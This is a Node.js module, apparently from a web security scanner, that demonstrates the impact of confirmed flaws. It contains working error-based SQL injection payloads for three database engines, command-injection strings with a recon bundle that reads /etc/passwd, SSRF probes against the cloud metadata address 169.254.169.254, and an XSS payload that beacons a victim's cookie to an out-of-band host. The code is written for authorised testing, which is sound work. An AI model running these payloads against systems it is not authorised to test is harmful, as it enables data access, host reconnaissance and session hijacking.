#!/usr/bin/env node
/**
 * Impact / post-exploitation proof — the "so what" layer. It goes beyond "this is exploitable" to
 * safely DEMONSTRATE the blast radius, using BENIGN, READ-ONLY, BOUNDED actions (never destructive —
 * no writes, no deletes, no data exfiltration beyond metadata evidence):
 *   - SQLi  → data-access proof: pull database METADATA (version / current user / current database /
 *             count of readable tables from information_schema) via the exact DBMS error format,
 *             proving real READ access to the database and its schema — not just injectability.
 *   - RCE   → foothold proof: confirm command execution with the `id` oracle, then capture a bounded
 *             read-only recon bundle (whoami / hostname / uname / first line of /etc/passwd) between
 *             random nonce markers — a real interactive foothold, demonstrated without touching anything.
 *   - SSRF  → cloud-metadata proof: point the SSRF sink at the cloud metadata service (169.254.169.254)
 *             IDENTITY/listing endpoints and confirm the instance's identity is reflected back — NEVER
 *             the security-credentials leaf that returns live secret keys.
 * Zero-FP: each demo confirms on a highly specific signature that only appears when the payload
 * actually executed (a provider-exact DBMS error; a random nonce that could only be echoed by a shell;
 * the exact metadata identity document, absent from a benign-URL baseline).
 * It re-uses the engine's method-aware injector + host-gated fetcher (passed in).
 */

import { randomUUID } from 'node:crypto';

const F = (tool, severity, target, detail) => ({
  tool,
  severity,
  target,
  detail,
  raw: JSON.stringify({ tool, detail }),
});

// Exact DBMS error formats these extraction techniques produce → provider-specific, zero-FP. Grouped by
// fact; sqliExtract tries providers in order and keeps the first value it pulls for each fact.
const EXTRACTORS = [
  // ── MySQL / MariaDB — error-based via extractvalue() → "XPATH syntax error: '~<value>'" ──
  ["' AND extractvalue(1,concat(0x7e,version()))-- -", /XPATH syntax error: '~([^']+)'/i, 'DB version'],
  ["' AND extractvalue(1,concat(0x7e,current_user()))-- -", /XPATH syntax error: '~([^']+)'/i, 'DB user'],
  ["' AND extractvalue(1,concat(0x7e,database()))-- -", /XPATH syntax error: '~([^']+)'/i, 'current database'],
  [
    "' AND extractvalue(1,concat(0x7e,(SELECT count(*) FROM information_schema.tables)))-- -",
    /XPATH syntax error: '~([^']+)'/i,
    'readable table count',
  ],
  // ── PostgreSQL — error-based via failed int cast → 'invalid input syntax for integer: "<value>"' ──
  ["' AND 1=cast(version() as int)-- -", /invalid input syntax for (?:type )?integer: "([^"]+)"/i, 'DB version'],
  ["' AND 1=cast(current_user as int)-- -", /invalid input syntax for (?:type )?integer: "([^"]+)"/i, 'DB user'],
  [
    "' AND 1=cast(current_database() as int)-- -",
    /invalid input syntax for (?:type )?integer: "([^"]+)"/i,
    'current database',
  ],
  [
    "' AND 1=cast((SELECT 't='||count(*) FROM information_schema.tables) as int)-- -",
    /invalid input syntax for (?:type )?integer: "([^"]+)"/i,
    'readable table count',
  ],
  // ── SQL Server — error-based via failed convert → "Conversion failed ... '<value>'" ──
  ["' AND 1=convert(int,@@version)-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'DB version'],
  ["' AND 1=convert(int,current_user)-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'DB user'],
  ["' AND 1=convert(int,db_name())-- -", /Conversion failed when converting[^']*'([^']+)'/i, 'current database'],
];

async function sqliExtract(url, { fetchT, injReq }) {
  const bl = injReq(url, 'sxnormal123');
  const baseline = (await fetchT(bl.url, bl.opts)).body || '';
  const facts = [];
  const seenType = new Set();
  const seenVal = new Set();
  for (const [payload, re, what] of EXTRACTORS) {
    if (seenType.has(what)) continue; // already pulled this fact from an earlier provider
    const q = injReq(url, payload);
    const body = (await fetchT(q.url, q.opts)).body || '';
    const m = body.match(re);
    // The error FORMAT is the zero-FP oracle (it only appears when the injected query executed).
    // Guard against reflected input by ignoring a value already in the benign baseline; and dedupe by
    // VALUE — if two fact types return byte-identical values, the channel isn't actually
    // distinguishing them (e.g. a sink that echoes one constant error), so we must not claim we pulled
    // separate pieces of data. Report each distinct value once, honestly.
    if (m?.[1] && !baseline.includes(m[1]) && !seenVal.has(m[1])) {
      facts.push(`${what}="${m[1].slice(0, 80)}"`);
      seenType.add(what);
      seenVal.add(m[1]);
    }
  }
  if (!facts.length) return null;
  return F(
    'impact-sqli-extract',
    'critical',
    url,
    `SQLi data-access PROVEN via error-based injection — the database is READABLE, not merely injectable: ${facts.join('; ')}`,
  );
}

// Bounded, read-only recon run once command execution is proven. Every command only READS state.
const RECON_BUNDLE = 'whoami; hostname; uname -a; head -n 1 /etc/passwd';

async function cmdContext(url, { fetchT, injReq }) {
  const UID_RE = /uid=(\d+)\(([\w.-]+)\)\s+gid=\d+\([\w.-]+\)/;
  // 1) Find a working separator using the `id` oracle (uid=…(…) is unforgeable unless a shell ran it).
  let hit = null;
  for (const sep of [';', '|', '&']) {
    for (const suffix of ['', ' #']) {
      const q = injReq(url, `${sep}id${suffix}`);
      const body = (await fetchT(q.url, q.opts)).body || '';
      const m = body.match(UID_RE);
      if (m) {
        hit = { sep, uid: m[1], user: m[2] };
        break;
      }
    }
    if (hit) break;
  }
  if (!hit) return null;

  // 2) RCE confirmed → capture a BOUNDED, READ-ONLY recon bundle between random nonce markers. The
  //    nonce could only appear in the response if our echo actually ran, so the captured block is
  //    genuine command output (zero-FP) — and nothing here writes, deletes, or exfiltrates data.
  const nonce = randomUUID().replace(/-/g, '');
  const open = `SX${nonce}O`;
  const close = `SX${nonce}C`;
  let evidence = '';
  try {
    const q = injReq(url, `${hit.sep} echo ${open}; ${RECON_BUNDLE}; echo ${close}`);
    const body = (await fetchT(q.url, q.opts)).body || '';
    const mm = body.match(new RegExp(`${open}\\s*([\\s\\S]*?)\\s*${close}`));
    if (mm) evidence = mm[1].trim().slice(0, 400);
  } catch {
    /* recon is best-effort; the id oracle already proved execution */
  }

  const rootTag = hit.uid === '0' ? ' — running as ROOT' : '';
  const evLine = evidence ? `\n  Read-only recon (whoami/hostname/uname/passwd):\n${evidence}` : '';
  return F(
    'impact-cmd-context',
    'critical',
    url,
    `Command-execution IMPACT PROVEN: ran 'id' → uid=${hit.uid}(${hit.user})${rootTag} — full OS command execution in this account.${evLine}`,
  );
}

// Set one query param on a URL (local helper — impact.mjs stays free of engine imports to avoid a cycle).
const setParam = (b, k, v) => {
  const u = new URL(b);
  u.searchParams.set(k, v);
  return u.toString();
};
// Common SSRF sink param names (mirrors the engine's SSRF_PARAMS) — the metadata proof tries the params
// already on the URL first, then these.
const SSRF_PARAM_NAMES = [
  'url',
  'uri',
  'path',
  'dest',
  'target',
  'callback',
  'webhook',
  'image',
  'img',
  'feed',
  'u',
  'link',
  'proxy',
  'fetch',
  'next',
  'remote',
  'host',
  'domain',
];
// BENIGN, read-only metadata endpoints — identity/listing only. The security-credentials leaf (live
// secret keys) is deliberately never requested. Signatures are the exact metadata content, not the URL.
const META_PROBES = [
  [
    'http://169.254.169.254/latest/dynamic/instance-identity/document',
    /"(?:instanceId|accountId|imageId)"\s*:/i,
    'AWS instance-identity document',
  ],
  [
    'http://169.254.169.254/latest/meta-data/',
    /(?:^|\n)(?:ami-id|instance-id|iam\/|local-ipv4|security-groups|public-keys)(?:\n|$)/i,
    'AWS IMDS metadata listing',
  ],
];

async function ssrfMetadata(target, { fetchT }) {
  let base;
  try {
    base = new URL(typeof target === 'string' ? target : target.url);
  } catch {
    return null; // metadata proof only applies to GET-URL sinks
  }
  const baseUrl = base.toString();
  const params = [...new Set([...base.searchParams.keys(), ...SSRF_PARAM_NAMES])].slice(0, 12);
  for (const p of params) {
    // Baseline: point the param at a benign external URL — its response must NOT carry a metadata signature.
    const benign =
      (await fetchT(setParam(baseUrl, p, 'http://sxbenign.invalid/'), {}, 6000).catch(() => ({}))).body || '';
    for (const [metaUrl, re, what] of META_PROBES) {
      const r = (await fetchT(setParam(baseUrl, p, metaUrl), {}, 6000).catch(() => ({}))).body || '';
      const m = r.match(re);
      if (m && !benign.includes(m[0]))
        return F(
          'impact-ssrf-metadata',
          'critical',
          baseUrl,
          `SSRF → CLOUD METADATA PROVEN: via param '${p}' the server fetched the ${what} at 169.254.169.254 and returned it — the instance's cloud identity is exposed (read-only proof; the live-credentials path is deliberately never touched)`,
        );
    }
  }
  return null;
}

// ── Stored-XSS → session theft / account takeover (headless-assisted) ───────────────────────────────
// The injected script runs in the VICTIM's authenticated browser and beacons document.cookie to an
// out-of-band URL. Zero-FP anchor: theft is proven ONLY when the victim's OWN session token comes back
// through that beacon — a value an attacker cannot produce unless the script truly executed in the
// victim's session and read their cookie. An HttpOnly session cookie is unreadable by document.cookie,
// so a properly-flagged session correctly yields NO proof (no false positive).
export const cookieExfilPayload = (oobUrl) =>
  `<img src=x onerror="new Image().src='${oobUrl}?c='+encodeURIComponent(document.cookie)">`;

export function confirmSessionTheft({ observations = [], secret, target = '' }) {
  if (!secret || secret.length < 8) return null; // need a real, high-entropy token to match on
  const carries = (o) => {
    if (typeof o !== 'string') return false;
    if (o.includes(secret)) return true;
    try {
      return decodeURIComponent(o).includes(secret);
    } catch {
      return false;
    }
  };
  if (!observations.some(carries)) return null;
  const shown = `${secret.slice(0, 4)}…${secret.slice(-2)}`;
  return F(
    'impact-xss-session-theft',
    'critical',
    target,
    `Stored-XSS ACCOUNT TAKEOVER PROVEN: the injected script executed in the victim's authenticated session, read document.cookie, and exfiltrated the victim's own session token (${shown}) out-of-band — a full session hijack. An HttpOnly session cookie would be unreadable here and correctly yields no proof.`,
  );
}

// exfil(payload, target) → array of strings observed on the beacon channel when the victim rendered the
// planted payload. Injected so the zero-FP core is unit-testable; the real implementation (proveXssExfil
// in crawler-headless.mjs) plants into a stored-XSS sink and renders as the victim in a real browser.
export async function runXssImpact({ targets = [], victimSecret, oobUrl = 'http://sx-exfil.invalid/b', exfil }) {
  if (!victimSecret || typeof exfil !== 'function') return [];
  const payload = cookieExfilPayload(oobUrl);
  const findings = [];
  for (const target of targets.slice(0, 5)) {
    const observations = (await Promise.resolve(exfil(payload, target)).catch(() => [])) || [];
    const f = confirmSessionTheft({ observations, secret: victimSecret, target });
    if (f) {
      findings.push(f);
      break;
    }
  }
  return findings;
}

// deps: { fetchT, injReq } from the engine (so injection stays method-aware + host-gated).
export async function runImpact({ report, fetchT, injReq }) {
  const findings = [];
  const done = new Set();
  const confirmed = (report.exploits || []).filter((e) => e.confirmed > 0);
  const targetsOf = (cls) => {
    const e = confirmed.find((x) => x.cls === cls);
    return e ? [...new Set((e.findings || []).map((f) => f.target).filter(Boolean))] : [];
  };
  // SQLi extraction impact.
  for (const url of [...targetsOf('sqli'), ...targetsOf('sqli-auth-bypass')].slice(0, 5)) {
    if (done.has(`sqli:${url}`)) continue;
    done.add(`sqli:${url}`);
    const imp = await sqliExtract(url, { fetchT, injReq }).catch(() => null);
    if (imp) {
      findings.push(imp);
      break;
    }
  }
  // Command-execution impact.
  for (const url of targetsOf('cmd-injection').slice(0, 5)) {
    const imp = await cmdContext(url, { fetchT, injReq }).catch(() => null);
    if (imp) {
      findings.push(imp);
      break;
    }
  }
  // SSRF → cloud-metadata impact.
  for (const url of targetsOf('ssrf').slice(0, 5)) {
    const imp = await ssrfMetadata(url, { fetchT }).catch(() => null);
    if (imp) {
      findings.push(imp);
      break;
    }
  }
  return findings;
}

export { sqliExtract, cmdContext, ssrfMetadata };
// cookieExfilPayload, confirmSessionTheft, runXssImpact are exported inline above (XSS session-theft core).
